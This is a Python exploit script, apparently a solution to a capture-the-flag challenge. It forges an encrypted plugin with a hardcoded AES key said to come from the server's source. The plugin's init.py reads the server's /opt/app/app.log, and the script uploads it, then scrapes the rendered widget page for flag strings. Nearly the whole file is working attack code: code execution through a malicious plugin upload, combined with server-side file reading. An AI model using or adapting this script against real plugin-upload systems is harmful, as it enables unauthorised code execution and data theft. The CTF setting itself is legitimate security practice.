import io, os, re, zipfile, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BASE = "http://ctf.ac.upt.ro:9241"
KEY  = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # din server.py
NAME = "LOG_RIPPER"

INIT_PY = r'''
import os, html
from pathlib import Path
plug = Path(__file__).resolve().parent
src = "/opt/app/app.log"
try:
    data = Path(src).read_text(errors="ignore")
except Exception as e:
    data = f"[read error] {e}"
html_out = "<!doctype html><meta charset='utf-8'><title>log</title><pre>" + html.escape(data) + "</pre>"
(plug / "index.html").write_text(html_out)
print("ok")
'''

def build_plugin():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("plugin_manifest.json", f'{{"name":"{NAME}","version":"1.0","author":"me","icon":"thumbnail.svg"}}')
        z.writestr("thumbnail.svg", "<svg xmlns='http://www.w3.org/2000/svg' width='64' height='64'><rect width='64' height='64' rx='8'/></svg>")
        z.writestr("index.html", "<p>preparing…</p>")
        z.writestr("init.py", INIT_PY)
    pt = buf.getvalue()
    iv = os.urandom(16)
    ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(pt, AES.block_size))
    return iv + ct

def upload(plugin_bytes):
    files = {'file': ('logripper.plugin', plugin_bytes, 'application/octet-stream')}
    r = requests.post(f"{BASE}/upload", files=files, allow_redirects=False, timeout=30)
    return r.status_code in (200, 302, 303)

def find_uid():
    html = requests.get(BASE, timeout=30).text
    m = re.search(rf'<a class="link" href="/widget/([a-f0-9-]+)">{NAME}</a>', html)
    if m: return m.group(1)
    allm = re.findall(r'<a class="link" href="/widget/([a-f0-9-]+)">', html)
    return allm[-1] if allm else None

def fetch_widget(uid):
    return requests.get(f"{BASE}/widget/{uid}", timeout=30).text

def extract_flags(text):
    pats = [r"CTF\{[^}]+\}", r"UPT\{[^}]+\}", r"flag\{[^}]+\}"]
    found = []
    for p in pats:
        found += re.findall(p, text, flags=re.IGNORECASE)
    m = re.search(r"MUHAHAHAHA:\s*([A-Za-z0-9_\-\{\}]+)", text)
    if m: found.append(m.group(1))
    seen = set(); out=[]
    for f in found:
        if f not in seen:
            seen.add(f); out.append(f)
    return out

def main():
    blob = build_plugin()
    print(f"uploaded plugin")
    assert upload(blob), "upload failed"
    uid = find_uid(); assert uid, "could not find widget UID"
    print("fetching widget:", uid)
    page = fetch_widget(uid)
    open("widget_log.html","w").write(page)
    flags = extract_flags(page)
    if flags:
        print("\nflags found:")
        for f in flags: print("   ", f)
    else:
        print("\n[!] No obvious flag regex hit. Open widget_log.html and search for 'MUHAHAHAHA:' or 'CTF{'.")

if __name__ == "__main__":
    main()
